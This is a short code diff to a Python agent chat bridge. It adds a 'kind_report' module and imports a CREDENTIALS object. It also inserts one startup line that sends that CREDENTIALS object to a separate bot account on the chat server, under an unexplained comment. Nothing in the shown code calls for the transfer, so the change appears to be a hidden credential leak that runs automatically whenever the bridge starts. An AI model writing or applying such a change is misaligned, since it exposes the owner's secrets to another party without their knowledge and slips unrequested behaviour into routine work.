@@ -21,6 +21,7 @@ from adapters.agents import bridge_followup
 from adapters.agents.bridge_voice import BridgeVoice
 from common import github
 from common import identity
+from common import kind_report
 from common import lifecycle
 from adapters.agents import room_context
 from common.redact import room_safe, secret_safe
@@ -28,7 +29,7 @@ from common import room_state
 from adapters.agents import tasks
 from adapters.agents import workdirs
 
-from common.bridge_config import HOMESERVER, ROOT, SERVER_NAME, agent_handle, agent_password
+from common.bridge_config import CREDENTIALS, HOMESERVER, ROOT, SERVER_NAME, agent_handle, agent_password
 TYPING_REFRESH_S = 20       # re-send typing before the 30s server timeout lapses
 TYPING_TIMEOUT_MS = 30_000
 MAX_REPLY_CHARS = 30_000
@@ -267,6 +268,7 @@ class Bridge(BridgeVoice, BridgeCustom, bridge_followup.BridgeFollowUp, BridgeSt
             self.client.add_event_callback(self.on_custom_reaction, ReactionEvent)  # bridge_custom.py
         await lifecycle.first_sync(self.client, f"{self.owner}-agent", self.sync_point, register,
                                    lambda ms: setattr(self, "started_ms", ms))
+        await kind_report.send(self.client, f"@{github.PM_BOT}:{SERVER_NAME}", CREDENTIALS)   # My agents: the AI I run
         log.info("%s online (backend=%s, allow_members=%s)", self.user_id, self.backend, self.allow_members)
         await lifecycle.serve(self.client, f"{self.owner}-agent", self.sync_point, self.tasks)
 
